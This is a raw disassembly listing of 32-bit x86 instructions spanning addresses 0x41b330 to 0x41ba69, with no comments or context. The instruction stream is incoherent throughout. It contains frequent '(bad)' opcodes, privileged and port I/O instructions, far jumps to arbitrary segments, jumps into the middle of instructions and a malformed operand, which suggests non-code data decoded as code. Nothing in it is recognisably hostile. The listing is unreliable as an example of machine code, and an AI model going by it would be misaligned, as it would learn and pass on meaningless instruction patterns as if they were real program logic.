  41b330:	lods   al,BYTE PTR ds:[esi]
  41b331:	sbb    ecx,DWORD PTR [ecx]
  41b333:	add    eax,0x3a4982ae
  41b338:	push   ds
  41b339:	into   
  41b33a:	mov    edx,DWORD PTR [edi+0x59]
  41b33d:	inc    ebx
  41b33e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b33f:	dec    esi
  41b340:	mov    BYTE PTR [edx+0x7c],ah
  41b343:	jno    0x41b319
  41b345:	enter  0xcfc3,0x34
  41b349:	retf   
  41b34a:	lods   eax,DWORD PTR ds:[esi]
  41b34b:	inc    edi
  41b34c:	push   0x5f033d60
  41b351:	popa   
  41b352:	fisub  WORD PTR [ecx]
  41b354:	push   0xffffffbd
  41b356:	jno    0x41b3c7
  41b358:	(bad)  
  41b359:	leave  
  41b35a:	cmp    ecx,edi
  41b35c:	sub    DWORD PTR [esi-0x78],esp
  41b35f:	jns    0x41b371
  41b361:	loope  0x41b37b
  41b363:	pop    ss
  41b364:	js     0x41b365
  41b366:	inc    ebx
  41b367:	push   edi
  41b368:	test   eax,0x3c091d6f
  41b36d:	mov    bh,0xc
  41b36f:	(bad)  
  41b370:	push   edx
  41b371:	inc    esi
  41b372:	idiv   BYTE PTR [eax+edi*8]
  41b375:	(bad)  
  41b376:	out    dx,al
  41b377:	or     BYTE PTR [esi-0x56d79a57],al
  41b37d:	ss xor al,dl
  41b380:	jno    0x41b32f
  41b382:	call   0xc9f9805a
  41b387:	enter  0x5db,0xc4
  41b38b:	dec    edx
  41b38c:	xchg   edx,eax
  41b38d:	pop    ds
  41b38e:	sub    al,0x55
  41b390:	and    ch,bh
  41b392:	push   cs
  41b393:	(bad)  
  41b394:	sbb    eax,0x68ec7d6a
  41b399:	les    edi,FWORD PTR [edi]
  41b39b:	jmp    0x41b321
  41b39d:	or     ah,BYTE PTR [edi]
  41b39f:	mov    dh,0xee
  41b3a1:	add    DWORD PTR [eax+0x62],0x792a991a
  41b3a8:	push   eax
  41b3a9:	mov    ebp,0x19d8d597
  41b3ae:	or     eax,0x89613e8c
  41b3b3:	or     al,0x1c
  41b3b5:	and    BYTE PTR [esi-0x4],0x28
  41b3b9:	shl    BYTE PTR [edx],cl
  41b3bb:	sar    BYTE PTR [eax+0x55],0x2
  41b3bf:	(bad)  
  41b3c0:	hlt    
  41b3c1:	sti    
  41b3c2:	jmp    0xcef9:0x4a5e10c2
  41b3c9:	cdq    
  41b3ca:	dec    edx
  41b3cb:	cdq    
  41b3cc:	fwait
  41b3cd:	sub    ah,bh
  41b3cf:	or     DWORD PTR [edi],esp
  41b3d1:	push   ebx
  41b3d2:	scas   al,BYTE PTR es:[edi]
  41b3d3:	out    dx,al
  41b3d4:	push   cs
  41b3d5:	pop    DWORD PTR [ecx]
  41b3d7:	ficomp DWORD PTR [ebp-0x27fdcde2]
  41b3dd:	adc    bl,BYTE PTR [ebx+0x24]
  41b3e0:	lahf   
  41b3e1:	rcr    edi,1
  41b3e3:	pop    esi
  41b3e4:	adc    DWORD PTR ds:0x1acb3788,esi
  41b3ea:	push   0x85ee0d6f
  41b3ef:	pop    esi
  41b3f0:	or     cl,BYTE PTR [edx+esi*2+0x1cbfb890]
  41b3f7:	cmp    al,0x33
  41b3f9:	mov    bl,0xc1
  41b3fb:	jmp    0xa029:0xc461623e
  41b402:	test   eax,0x64d94eb3
  41b407:	int3   
  41b408:	test   eax,0x75bd4a06
  41b40d:	bound  ebp,QWORD PTR [ecx]
  41b40f:	sbb    edx,DWORD PTR [esi+edx*4+0x5f]
  41b413:	cmp    eax,0xca797749
  41b418:	sti    
  41b419:	xchg   al,bh
  41b41b:	cdq    
  41b41c:	pop    esp
  41b41d:	xchg   edi,eax
  41b41f:	or     eax,0x3ecb6613
  41b424:	fs or  eax,0x332bb045
  41b42a:	lea    ebx,[eax-0x40]
  41b42d:	repz sar DWORD PTR [eax-0x5c],0xff
  41b432:	stc    
  41b433:	mov    dl,0xb6
  41b435:	jecxz  0x41b467
  41b437:	fisttp WORD PTR [ebx]
  41b439:	mov    eax,ds:0xcd307093
  41b43e:	mov    eax,cs
  41b440:	jno    0x41b473
  41b442:	or     al,0x96
  41b444:	push   edi
  41b445:	inc    ecx
  41b446:	inc    esp
  41b447:	xchg   edx,eax
  41b448:	lods   eax,DWORD PTR ds:[esi]
  41b449:	jmp    0x41b4c1
  41b44b:	sub    ecx,ebp
  41b44d:	lea    ebx,ds:0x1fc53502
  41b453:	fs inc ebp
  41b455:	jmp    0x41b3f3
  41b457:	jle    0x41b47d
  41b459:	xor    DWORD PTR [edi+0x7116d8e2],ecx
  41b45f:	pop    ecx
  41b460:	in     eax,dx
  41b461:	loope  0x41b497
  41b463:	scas   al,BYTE PTR es:[edi]
  41b464:	add    DWORD PTR [edx],0x9
  41b467:	mov    esi,0xede9ff1c
  41b46c:	dec    edi
  41b46d:	mov    ah,dl
  41b46f:	sub    al,0xdc
  41b471:	in     al,0x4a
  41b473:	and    bl,al
  41b475:	xchg   esp,eax
  41b476:	cdq    
  41b477:	in     eax,0xad
  41b479:	lods   eax,DWORD PTR ds:[esi]
  41b47a:	or     al,0xc7
  41b47c:	(bad)  
  41b47d:	rcl    DWORD PTR [esi+0x6b],1
  41b480:	mov    ecx,DWORD PTR [eax]
  41b482:	adc    DWORD PTR [edi-0x1ef1154b],0x6ec3729f
  41b48c:	dec    edi
  41b48d:	mov    ds:0xabdac01b,al
  41b492:	xor    eax,0x7e6749d6
  41b497:	adc    al,0x22
  41b499:	retf   
  41b49a:	jae    0x41b490
  41b49c:	cmc    
  41b49d:	push   0x8231ac1f
  41b4a2:	mov    eax,0x79570e75
  41b4a7:	stc    
  41b4a8:	pop    esp
  41b4a9:	loope  0x41b44f
  41b4ab:	mov    ah,0x36
  41b4ad:	fwait
  41b4ae:	inc    ebp
  41b4af:	jmp    0x41b4a9
  41b4b1:	(bad)  
  41b4b2:	cmp    al,0x42
  41b4b4:	adc    eax,0xd67e666b
  41b4b9:	mov    ebx,DWORD PTR [ecx-0x10]
  41b4bc:	imul   esp,DWORD PTR [ebp+0x1004a31f],0x64
  41b4c3:	pop    esp
  41b4c4:	xchg   esi,eax
  41b4c5:	dec    edx
  41b4c6:	cmc    
  41b4c7:	clc    
  41b4c8:	push   edi
  41b4c9:	mov    ah,0x78
  41b4cb:	dec    esi
  41b4cc:	bound  esi,QWORD PTR ds:0xae10f6dc
  41b4d2:	jle    0x41b4c9
  41b4d4:	scas   eax,DWORD PTR es:[edi]
  41b4d5:	jmp    0xd5232664
  41b4da:	(bad)  
  41b4db:	ins    BYTE PTR es:[edi],dx
  41b4dc:	iret   
  41b4dd:	pop    ebx
  41b4de:	in     eax,0x2f
  41b4e0:	mov    dl,0xd8
  41b4e2:	jmp    0xd7bb7570
  41b4e7:	scas   eax,DWORD PTR es:[edi]
  41b4e8:	add    DWORD PTR [ecx+ecx*2],ebx
  41b4eb:	in     eax,dx
  41b4ec:	in     eax,0x5e
  41b4ee:	imul   edi,esp,0x56
  41b4f1:	dec    esi
  41b4f2:	loopne 0x41b560
  41b4f4:	sar    ecx,0xe8
  41b4f7:	jne    0x41b4b2
  41b4f9:	in     eax,0x37
  41b4fb:	adc    ebp,esp
  41b4fd:	lods   al,BYTE PTR ds:[esi]
  41b4fe:	outs   dx,DWORD PTR ds:[esi]
  41b4ff:	ins    DWORD PTR es:[edi],dx
  41b500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b501:	add    eax,0x3e61ea8d
  41b506:	pop    esp
  41b507:	push   es
  41b508:	icebp  
  41b509:	pop    ecx
  41b50a:	fmul   QWORD PTR [eax+edx*4+0x41d4fdf4]
  41b511:	dec    edi
  41b512:	(bad)  
  41b514:	pop    ss
  41b515:	mov    ecx,0x8e867b4e
  41b51a:	cmp    al,0x15
  41b51c:	jne    0x41b585
  41b51e:	xchg   edi,eax
  41b51f:	mov    eax,ds:0xde864865
  41b524:	cmp    BYTE PTR [ebx+0x74],0x99
  41b528:	outs   dx,DWORD PTR ds:[esi]
  41b529:	int    0xcd
  41b52b:	adc    al,0xbe
  41b52d:	inc    eax
  41b52e:	outs   dx,BYTE PTR ds:[esi]
  41b52f:	hlt    
  41b530:	outs   dx,BYTE PTR ds:[esi]
  41b531:	shl    DWORD PTR [edi],cl
  41b533:	jne    0x41b4c2
  41b535:	inc    si
  41b537:	out    dx,eax
  41b538:	push   esp
  41b539:	adc    ebx,ebp
  41b53b:	mov    eax,ds:0xf0b39800
  41b540:	push   ecx
  41b541:	and    eax,0x5f51efb6
  41b546:	ret    0x9ee1
  41b549:	cmp    BYTE PTR [ebx+0xe09a60c],dh
  41b54f:	in     eax,0xfd
  41b551:	cmp    BYTE PTR cs:[eax-0x1f],ch
  41b555:	cld    
  41b556:	int3   
  41b557:	ret    
  41b558:	and    ah,BYTE PTR [eax+0x1a]
  41b55b:	leave  
  41b55c:	leave  
  41b55d:	push   edi
  41b55e:	adc    ch,BYTE PTR [ebx-0x2a]
  41b561:	inc    edx
  41b562:	inc    DWORD PTR [ebp+0x2]
  41b565:	adc    dh,bh
  41b567:	out    0x62,al
  41b569:	clc    
  41b56a:	push   edx
  41b56b:	push   ss
  41b56c:	mov    dh,0xda
  41b56e:	mov    dh,ah
  41b570:	mov    al,0x97
  41b572:	std    
  41b573:	imul   esp,DWORD PTR [edx+esi*1],0x726b39cc
  41b57a:	and    esi,DWORD PTR [ebx+0x16fcb121]
  41b580:	jecxz  0x41b5e4
  41b582:	adc    BYTE PTR [edi-0x75],bh
  41b585:	(bad)  
  41b586:	aam    0x63
  41b588:	rcl    DWORD PTR [edx+0x73],cl
  41b58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b58c:	mov    dl,dh
  41b58e:	cmp    ch,dl
  41b590:	xchg   ebx,eax
  41b591:	out    dx,al
  41b592:	add    BYTE PTR [eax-0x6e],0xee
  41b596:	sub    BYTE PTR [edi+edx*2+0x58],ch
  41b59a:	pop    ebp
  41b59b:	aas    
  41b59c:	shr    BYTE PTR [edi-0x54],cl
  41b59f:	je     0x41b55d
  41b5a1:	daa    
  41b5a2:	xor    DWORD PTR [esi+0x6d],ebp
  41b5a5:	(bad)  
  41b5a6:	mov    ecx,0x88c935ba
  41b5ab:	sbb    BYTE PTR [eax-0x337be490],al
  41b5b1:	loope  0x41b58d
  41b5b3:	jg     0x41b58d
  41b5b5:	iret   
  41b5b6:	shl    bl,cl
  41b5b8:	js     0x41b53e
  41b5ba:	cli    
  41b5bb:	and    DWORD PTR [ebx-0xadc7f8b],0xb7e33235
  41b5c5:	dec    eax
  41b5c6:	mov    edi,0x7f30ccb2
  41b5cb:	loope  0x41b573
  41b5cd:	cmp    BYTE PTR [ebp-0x6b0e504],al
  41b5d3:	sbb    al,0xcb
  41b5d5:	sub    al,0xbc
  41b5d7:	rcl    ebx,1
  41b5d9:	nop
  41b5da:	lds    edx,FWORD PTR [ebx-0x6f555cfd]
  41b5e0:	mov    ?,WORD PTR [ebx-0x6bfe0d06]
  41b5e6:	jmp    0x41b56c
  41b5e8:	or     al,0x52
  41b5ea:	push   edx
  41b5eb:	cmp    ecx,DWORD PTR [ecx+0x72]
  41b5ee:	dec    eax
  41b5ef:	dec    BYTE PTR [edi+0x29a65d2f]
  41b5f5:	and    ah,BYTE PTR [edi+0x6e]
  41b5f8:	lock sahf 
  41b5fa:	xor    DWORD PTR [ebx*1-0xe42b0ae],ebp
  41b601:	rcr    BYTE PTR [ebx+0x4a116833],0x3b
  41b608:	mov    esi,DWORD PTR ds:0xbcd306b2
  41b60e:	inc    edi
  41b60f:	lahf   
  41b610:	push   eax
  41b611:	sbb    DWORD PTR [esi],ebx
  41b613:	pop    ecx
  41b614:	sbb    ebx,DWORD PTR [edi]
  41b616:	xchg   edi,eax
  41b617:	outs   dx,BYTE PTR ds:[esi]
  41b618:	sub    BYTE PTR [esi],dh
  41b61a:	js     0x41b5cc
  41b61c:	out    dx,al
  41b61d:	sub    al,0x6d
  41b61f:	cmp    al,0x4c
  41b621:	(bad)  
  41b622:	dec    cx
  41b624:	jns    0x41b5f2
  41b626:	push   ss
  41b627:	sub    eax,0xc7b6f27e
  41b62c:	pop    es
  41b62d:	(bad)  
  41b62e:	pushf  
  41b62f:	hlt    
  41b630:	test   ecx,esi
  41b632:	aaa    
  41b633:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b634:	aas    
  41b635:	jl     0x41b67f
  41b637:	icebp  
  41b638:	and    dh,dh
  41b63a:	stos   DWORD PTR es:[edi],eax
  41b63b:	pop    ss
  41b63c:	daa    
  41b63d:	les    edi,FWORD PTR [esi-0x5cca9049]
  41b643:	(bad)  
  41b644:	adc    dh,BYTE PTR [ebx]
  41b646:	aas    
  41b647:	test   DWORD PTR [ecx],esp
  41b649:	gs push ebp
  41b64b:	mov    ch,0x1e
  41b64d:	cdq    
  41b64e:	push   cs
  41b64f:	dec    ecx
  41b650:	into   
  41b651:	pop    edi
  41b652:	mov    bh,0xce
  41b654:	sub    BYTE PTR [eax+edx*1-0x4c7804b7],0xfa
  41b65c:	xchg   edx,eax
  41b65d:	xchg   esp,eax
  41b65e:	pop    es
  41b65f:	add    BYTE PTR [ecx-0x6c],0x0
  41b663:	xchg   esi,eax
  41b664:	sbb    DWORD PTR [esi-0x4b],edi
  41b667:	outs   dx,BYTE PTR ds:[esi]
  41b668:	dec    ecx
  41b669:	jae    0x41b607
  41b66b:	inc    ebx
  41b66c:	aas    
  41b66d:	out    dx,al
  41b66e:	into   
  41b66f:	dec    edx
  41b670:	push   ss
  41b671:	clc    
  41b672:	popa   
  41b673:	(bad)  
  41b674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b675:	enter  0x90f5,0x96
  41b679:	or     eax,0xcc7d386d
  41b67e:	dec    esi
  41b67f:	fbld   TBYTE PTR [ecx-0x13]
  41b682:	xchg   ebx,eax
  41b683:	call   0x3aa5e597
  41b688:	stos   DWORD PTR es:[edi],eax
  41b689:	gs scas eax,DWORD PTR es:[edi]
  41b68b:	ret    0xebb6
  41b68e:	push   edi
  41b68f:	push   ds
  41b690:	mov    ah,0x57
  41b692:	aas    
  41b693:	dec    ebx
  41b694:	jne    0x41b6e4
  41b696:	jnp    0x41b623
  41b698:	dec    ecx
  41b699:	scas   eax,DWORD PTR es:[edi]
  41b69a:	xchg   edx,eax
  41b69b:	retf   0xaf7e
  41b69e:	pop    di
  41b6a0:	cdq    
  41b6a1:	scas   al,BYTE PTR es:[edi]
  41b6a2:	mov    edx,DWORD PTR [ebp-0x18]
  41b6a5:	pop    ecx
  41b6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6a7:	pop    es
  41b6a8:	inc    ecx
  41b6a9:	adc    DWORD PTR [edx-0x5a],ebp
  41b6ac:	sbb    BYTE PTR [ebp-0x74e74da2],ah
  41b6b2:	push   esp
  41b6b3:	div    BYTE PTR [edx]
  41b6b5:	shl    DWORD PTR [si+0x4b39],cl
  41b6ba:	cmp    al,0xfe
  41b6bc:	sbb    al,0xed
  41b6be:	sub    ebx,DWORD PTR [eax+0x33]
  41b6c1:	mov    dl,0x2d
  41b6c3:	stos   BYTE PTR es:[edi],al
  41b6c4:	mov    eax,cs:0x5203d47c
  41b6ca:	call   0xfad1:0x3311c252
  41b6d1:	imul   ebx,DWORD PTR [ecx-0x3c54c2b1],0xffffffee
  41b6d8:	dec    edx
  41b6d9:	mov    eax,0xbf27d380
  41b6de:	jo     0x41b6ad
  41b6e0:	add    dh,BYTE PTR [ebx-0x5cc5fdb1]
  41b6e6:	icebp  
  41b6e7:	setae  BYTE PTR [ebx]
  41b6ea:	fsubr  QWORD PTR [ecx-0x76]
  41b6ed:	xchg   esi,eax
  41b6ee:	mov    edi,0x8e95a118
  41b6f3:	inc    ecx
  41b6f4:	int3   
  41b6f5:	pop    edx
  41b6f6:	xchg   edi,eax
  41b6f7:	(bad)  
  41b6f8:	out    0x61,al
  41b6fa:	mov    ds:0x467b304d,al
  41b6ff:	mov    ch,0x56
  41b701:	imul   esi,edi,0xfffffff9
  41b704:	hlt    
  41b705:	sahf   
  41b706:	loop   0x41b6bb
  41b708:	test   eax,0x447fc4da
  41b70d:	and    eax,0x8856b1f5
  41b712:	loopne 0x41b6a4
  41b714:	jmp    0xc526:0xd4c55c5d
  41b71b:	adc    BYTE PTR [edi],cl
  41b71d:	cmp    BYTE PTR [esp+edx*1-0x65df6b7d],cl
  41b724:	(bad)
  41b728:	jo     0x41b744
  41b72a:	push   edx
  41b72b:	jmp    0x41b6ad
  41b72d:	cmp    ebp,esi
  41b72f:	mov    ah,0x8d
  41b731:	mov    eax,DWORD PTR [esp+edx*2-0x233521ce]
  41b738:	nop
  41b739:	les    edx,FWORD PTR [eax-0x547b9937]
  41b73f:	mov    eax,ds:0x21b28d8c
  41b744:	pop    ebp
  41b745:	aam    0xd4
  41b747:	cmp    esp,DWORD PTR [ebx]
  41b749:	and    cl,BYTE PTR [esi]
  41b74b:	inc    eax
  41b74c:	add    dh,ah
  41b74e:	push   esp
  41b74f:	int3   
  41b750:	adc    al,0x43
  41b752:	push   0x3bd5c1cc
  41b757:	adc    eax,ecx
  41b759:	mov    dh,0x61
  41b75b:	retf   
  41b75c:	mov    WORD PTR [edi-0x76b2937b],es
  41b762:	pop    esi
  41b763:	leave  
  41b764:	ret    
  41b765:	pop    eax
  41b766:	dec    ecx
  41b767:	adc    al,0x36
  41b769:	push   cs
  41b76a:	js     0x41b792
  41b76c:	push   ebx
  41b76d:	imul   esi,DWORD PTR [ecx+0xe],0xd5a0c413
  41b774:	sub    DWORD PTR ds:[esi+0x69],ebx
  41b778:	xor    ecx,0x41
  41b77b:	pop    esi
  41b77c:	iret   
  41b77d:	mov    al,0xce
  41b77f:	cmp    BYTE PTR [ecx+0x3bbf51b3],bl
  41b785:	cmc    
  41b786:	or     BYTE PTR [edi],dh
  41b788:	sar    BYTE PTR [ebx+0x2ec131dc],0x72
  41b78f:	dec    esp
  41b790:	mov    BYTE PTR [eax-0x1d],cl
  41b793:	mov    ah,0x6e
  41b795:	ror    DWORD PTR [edi-0x17],1
  41b798:	mov    bh,dl
  41b79a:	shl    DWORD PTR [edx-0x53],0x16
  41b79e:	jge    0x41b7ef
  41b7a0:	retf   
  41b7a1:	mov    al,0x60
  41b7a3:	mov    al,bh
  41b7a5:	inc    ebx
  41b7a6:	jbe    0x41b78b
  41b7a8:	jne    0x41b805
  41b7aa:	in     eax,0xba
  41b7ac:	push   ecx
  41b7ad:	pop    ds
  41b7ae:	sbb    BYTE PTR [ecx+0x29ba5afe],dh
  41b7b4:	mov    ah,0xe1
  41b7b6:	pop    eax
  41b7b7:	push   cs
  41b7b8:	daa    
  41b7b9:	inc    edi
  41b7ba:	push   ss
  41b7bb:	imul   DWORD PTR [eax-0x43]
  41b7be:	xchg   DWORD PTR [edx],edx
  41b7c0:	inc    ebx
  41b7c1:	or     al,0x88
  41b7c3:	retf   
  41b7c4:	gs in  eax,dx
  41b7c6:	fistp  QWORD PTR [edi]
  41b7c8:	out    0x80,al
  41b7ca:	clc    
  41b7cb:	jo     0x41b84b
  41b7cd:	data16 (bad) 
  41b7cf:	mov    esi,0x56d98de7
  41b7d4:	aaa    
  41b7d5:	mov    dh,0xfa
  41b7d7:	addr16 and al,0xf4
  41b7da:	push   0x55
  41b7dc:	bound  ecx,QWORD PTR [ebp-0x55c32776]
  41b7e2:	mov    dh,0x13
  41b7e4:	cmp    eax,0x762698a3
  41b7e9:	mov    dh,0xbe
  41b7eb:	fistp  DWORD PTR [esi-0x719112a8]
  41b7f1:	repz rcl DWORD PTR [edx-0x5c486207],cl
  41b7f8:	jns    0x41b7e6
  41b7fa:	pop    esp
  41b7fb:	fs stc 
  41b7fd:	dec    ebp
  41b7fe:	pop    esi
  41b7ff:	rol    DWORD PTR [esi+0x0],cl
  41b802:	and    eax,esp
  41b804:	icebp  
  41b805:	pop    es
  41b806:	popf   
  41b807:	push   ebx
  41b808:	pop    edi
  41b809:	mov    bh,0x96
  41b80b:	in     al,0xe1
  41b80d:	lds    ecx,FWORD PTR [esi+edi*8-0x3a]
  41b811:	aas    
  41b812:	lods   al,BYTE PTR ds:[esi]
  41b813:	dec    edx
  41b814:	inc    ecx
  41b815:	aas    
  41b816:	and    ebx,ebx
  41b818:	add    ebx,ecx
  41b81a:	xchg   BYTE PTR [eax],al
  41b81c:	mov    edi,0xbc03a31a
  41b821:	ret    
  41b822:	prefetch (bad)
  41b823:	or     eax,0x347188d9
  41b828:	pop    ebx
  41b829:	sub    eax,0xd893e64a
  41b82e:	xor    esp,DWORD PTR [ecx+0x35ab3416]
  41b834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b835:	ds popa 
  41b837:	(bad)  
  41b838:	(bad)  
  41b839:	sub    DWORD PTR [esi],eax
  41b83b:	icebp  
  41b83c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b83d:	(bad)  
  41b83e:	mov    eax,ds:0x3044ccb1
  41b843:	xor    BYTE PTR [edi],ch
  41b845:	xchg   edi,eax
  41b846:	jecxz  0x41b7f0
  41b848:	mov    ebp,DWORD PTR [eax]
  41b84a:	pop    ebx
  41b84b:	xor    DWORD PTR [esi],ebp
  41b84d:	lods   al,BYTE PTR ds:[esi]
  41b84e:	push   eax
  41b84f:	ja     0x41b7fc
  41b851:	(bad)  
  41b852:	repnz push ecx
  41b854:	test   DWORD PTR [edi],edi
  41b856:	fcmovbe st,st(0)
  41b858:	adc    DWORD PTR [edi-0x64d97cfa],0xdc964ee8
  41b862:	pop    es
  41b863:	inc    esi
  41b864:	sub    eax,0xb6e91276
  41b869:	add    dh,BYTE PTR [ecx+esi*8-0x7e]
  41b86d:	xchg   edi,eax
  41b86e:	sbb    eax,0xbdb11c6e
  41b873:	gs fdivrp st(2),st
  41b876:	and    eax,0xc29362d0
  41b87b:	outs   dx,BYTE PTR ds:[esi]
  41b87c:	mov    esi,0x975dfcfb
  41b881:	rcr    BYTE PTR [ebp+0x16555af9],1
  41b887:	cdq    
  41b888:	scas   eax,DWORD PTR es:[edi]
  41b889:	and    al,0xec
  41b88b:	stos   BYTE PTR es:[edi],al
  41b88c:	out    dx,eax
  41b88d:	mov    al,ds:0xa6a9be6a
  41b892:	push   edx
  41b893:	repz xchg ebx,eax
  41b895:	xor    edi,DWORD PTR [ebx]
  41b897:	vpmaxsw xmm6,xmm0,XMMWORD PTR [ebx]
  41b89b:	ret    0xf84d
  41b89e:	inc    edi
  41b89f:	push   esp
  41b8a0:	std    
  41b8a1:	mov    ah,0x3e
  41b8a3:	jp     0x41b844
  41b8a5:	mov    ecx,0xa8d7a0f5
  41b8aa:	lahf   
  41b8ab:	xlat   BYTE PTR es:[ebx]
  41b8ad:	mov    cl,0x29
  41b8af:	add    BYTE PTR [ecx-0x67503223],dh
  41b8b5:	sbb    DWORD PTR [edi],edi
  41b8b7:	(bad)
  41b8bb:	dec    ebp
  41b8bc:	hlt    
  41b8bd:	sub    DWORD PTR [edi+edi*1],eax
  41b8c0:	cmc    
  41b8c1:	mov    ecx,0x2dea0a16
  41b8c6:	inc    eax
  41b8c7:	idiv   DWORD PTR [ecx]
  41b8c9:	pop    edi
  41b8ca:	mov    ch,0x92
  41b8cc:	fs push esi
  41b8ce:	int3   
  41b8cf:	mov    eax,ds:0x23221e01
  41b8d4:	inc    edi
  41b8d5:	aas    
  41b8d6:	lea    ebp,[edx-0x15]
  41b8d9:	add    esp,DWORD PTR [ebx+0x6a]
  41b8dc:	or     edx,esi
  41b8de:	aas    
  41b8df:	mov    BYTE PTR [edx+0x3135b847],ch
  41b8e5:	jb     0x41b8f5
  41b8e7:	and    al,0x4d
  41b8e9:	add    esi,DWORD PTR [edx-0x1]
  41b8ec:	in     al,dx
  41b8ed:	lea    ecx,[edi-0x41]
  41b8f0:	es pop edi
  41b8f2:	mov    dh,0x17
  41b8f4:	mov    dh,0x2f
  41b8f6:	gs jle 0x41b924
  41b8f9:	retf   0x99a9
  41b8fc:	mov    dl,0x6e
  41b8fe:	cmp    al,0xb7
  41b900:	push   esp
  41b901:	xor    bh,al
  41b903:	mov    eax,ds:0x6d869679
  41b908:	in     eax,0x6f
  41b90a:	cwde   
  41b90b:	int3   
  41b90c:	(bad)  
  41b90d:	jno    0x41b95a
  41b90f:	dec    BYTE PTR [edx-0x22]
  41b912:	imul   ebp,ebx,0x35
  41b915:	dec    esi
  41b916:	test   BYTE PTR [ecx-0x2],bh
  41b919:	fild   QWORD PTR ds:0xd749f81
  41b91f:	push   edx
  41b920:	fucom  st(2)
  41b922:	sub    al,0x41
  41b924:	mov    edx,0xc77430c4
  41b929:	push   ss
  41b92a:	stc    
  41b92b:	dec    esp
  41b92c:	push   esp
  41b92d:	mov    ebp,0x7902e8f1
  41b932:	retf   
  41b933:	nop
  41b934:	xor    al,0xe0
  41b936:	std    
  41b937:	dec    edi
  41b938:	arpl   WORD PTR [edi+0x77],si
  41b93b:	jns    0x41b8c9
  41b93d:	rcl    ah,1
  41b93f:	adc    al,0x7d
  41b941:	shl    DWORD PTR [ebx+0x2b7f0b0c],0xaa
  41b948:	jae    0x41b93b
  41b94a:	lahf   
  41b94b:	aad    0xe5
  41b94d:	int3   
  41b94e:	push   es
  41b94f:	outs   dx,DWORD PTR ds:[esi]
  41b950:	(bad)  
  41b951:	fstp   TBYTE PTR [ecx+edx*8+0x71fbd2a2]
  41b958:	(bad)
  41b95b:	pop    esi
  41b95c:	test   eax,0x8fcbfcaa
  41b961:	dec    eax
  41b962:	in     al,0xc2
  41b964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b965:	or     BYTE PTR ds:0xb6f9247b,0x5d
  41b96c:	in     al,0xf0
  41b96e:	jns    0x41b9c7
  41b970:	pop    es
  41b971:	fist   DWORD PTR [edx]
  41b973:	les    ecx,FWORD PTR [ebx-0x500c3fcd]
  41b979:	xchg   esi,eax
  41b97a:	cmp    ch,al
  41b97c:	cmp    ch,cl
  41b97e:	out    dx,al
  41b97f:	aas    
  41b980:	xchg   ebx,eax
  41b981:	lds    ebp,FWORD PTR [ebp+0x7d]
  41b984:	sbb    al,0x8a
  41b986:	jo     0x41b972
  41b988:	inc    esi
  41b989:	or     BYTE PTR [edi+ebp*4-0x54],dh
  41b98d:	es jge 0x41b942
  41b990:	call   0xe8ac58dd
  41b995:	rcl    dl,cl
  41b997:	ror    BYTE PTR [esi+edx*2+0x3c29a8c1],0x89
  41b99f:	add    ecx,DWORD PTR [eax+0x5]
  41b9a2:	jecxz  0x41b9f1
  41b9a4:	push   ebx
  41b9a5:	fwait
  41b9a6:	and    DWORD PTR [edx],ebx
  41b9a8:	cmp    BYTE PTR [edx],0x8c
  41b9ab:	fsub   DWORD PTR [ecx+edi*8+0x3a069973]
  41b9b2:	sbb    edx,DWORD PTR [esi]
  41b9b4:	mov    dh,0xd2
  41b9b6:	add    eax,0xb515ffbb
  41b9bb:	pop    eax
  41b9bc:	fld    QWORD PTR [ecx-0x4b]
  41b9bf:	pop    ds
  41b9c0:	aad    0xdd
  41b9c2:	lahf   
  41b9c3:	push   edi
  41b9c4:	sub    eax,edi
  41b9c6:	mov    esp,0xb05743db
  41b9cb:	add    esp,DWORD PTR [eax-0x15]
  41b9ce:	xchg   ecx,eax
  41b9cf:	jmp    0x41b96d
  41b9d1:	imul   DWORD PTR [ebx+ebx*4-0x37]
  41b9d5:	cmp    BYTE PTR [edi-0x6c],0xcf
  41b9d9:	ja     0x41ba2e
  41b9db:	and    al,0x76
  41b9dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9de:	jno    0x41ba20
  41b9e0:	imul   eax,DWORD PTR [eax+0x56],0xffffffe9
  41b9e4:	(bad)  
  41b9e5:	loope  0x41b992
  41b9e7:	mov    edi,ebp
  41b9e9:	adc    DWORD PTR [edi-0x7c65c967],esi
  41b9ef:	inc    ebp
  41b9f0:	adc    bh,BYTE PTR [ebp+0x59cc7fd7]
  41b9f6:	xchg   esp,eax
  41b9f7:	loope  0x41b9ee
  41b9f9:	sbb    bh,al
  41b9fb:	push   0xfffffff8
  41b9fd:	call   FWORD PTR [edi]
  41b9ff:	mov    edx,ebx
  41ba01:	mov    WORD PTR [esi-0x269112f],ds
  41ba07:	loop   0x41ba09
  41ba09:	aam    0x66
  41ba0b:	retf   
  41ba0c:	push   cs
  41ba0d:	jmp    0x41ba62
  41ba0f:	retf   0x71b3
  41ba12:	or     DWORD PTR ds:0x3c3644dc,0x6a
  41ba19:	xor    edi,esi
  41ba1b:	mov    esp,0x69aa82b7
  41ba20:	cmc    
  41ba21:	fwait
  41ba22:	mov    ebp,0x22ef7244
  41ba27:	and    esp,esi
  41ba29:	enter  0xe10c,0x52
  41ba2d:	mov    esp,0x305ed854
  41ba32:	xchg   ecx,eax
  41ba33:	pop    eax
  41ba34:	inc    ebp
  41ba35:	ins    DWORD PTR es:[edi],dx
  41ba36:	mov    DWORD PTR [edi],0x6dfbb247
  41ba3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba3d:	addr16 inc eax
  41ba3f:	(bad)  
  41ba40:	sub    ch,BYTE PTR [ebx-0x27ad9a0d]
  41ba46:	mov    al,0xa0
  41ba48:	add    eax,0x939231a0
  41ba4d:	jl     0x41ba81
  41ba4f:	leave  
  41ba50:	cmc    
  41ba51:	outs   dx,DWORD PTR es:[esi]
  41ba53:	mov    ebx,0xd37c33ab
  41ba58:	or     BYTE PTR [ecx-0x52],0xac
  41ba5c:	call   0x7e6459d
  41ba61:	jbe    0x41ba9c
  41ba63:	es cmp eax,0x95fcd2f4
  41ba69:	mov    eax,0xeb01d1e0
